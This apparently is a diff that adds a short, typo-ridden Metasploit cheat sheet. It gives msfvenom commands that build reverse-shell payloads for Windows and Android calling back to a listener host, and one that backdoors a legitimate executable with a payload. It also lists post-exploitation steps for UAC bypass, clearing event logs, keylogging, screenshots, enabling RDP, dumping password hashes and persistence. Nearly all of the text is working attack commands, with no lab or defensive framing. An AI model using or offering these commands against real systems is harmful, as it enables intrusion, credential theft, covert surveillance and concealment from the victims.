@@ -1,0 +1,48 @@
+before to start msf check about update ->
+command: sudo apt update; sudo apt install metasploit-framework
+
+to strart metasploti ->
+command: sudo msfconsole
+
+to encode metasploit paylod use ' generate ' command with -h parameter
+
+
+[+] to create payload for windows machines use msfvenom -> 
+coommand: msfvenom -p windows/meterpreter/reverse_tcp lhost=69.69.69.9 lport=4444 -i 5 -b '\x00' -f exe -o testatwi.exe
+p: payload
+i: incode
+f: format
+o: output 
+lhost: local host
+lport: locla port
+
+-> use exploit/multi/handler
+
+[+] to creat payload for android devices use msfvenom -> 
+command: msfvenom -p android/meterpreter/reverse_tcp lhost=69.69.69.9 lport=4444 -o me.apk
+
+[+] to get from meterpreter user to admin by pass AUC use: 
+command: msf -> use exploit/windows/local/bypassuac
+
+[+] to clear logs after hack the machine use:
+command: meterpreter -> clearev
+
+[+] to start keylogger on rhost: 
+command: meterpreter-> keyscan_start , keyscan_dump , keyscan_stop
+
+[+] to take screenshot: 
+command: meterpreter -> screenshot
+
+[+] to remote desktop: 
+command: use post/windows/manage/enable_rdp
+	 set session 
+
+[+] to dump the passwords on the system: 
+command: hashdump
+
+[+] to keep your self on the target machineP:
+command: use exploit/windows/local/persistence
+ 	 
+[+]
+command: msfvenom -a x86 --platform windows -x program.exe -k -p windwos/meterpreter/reverse_shell lhost=69.69.69.9 lport=69 -f exe -o f.exe
+
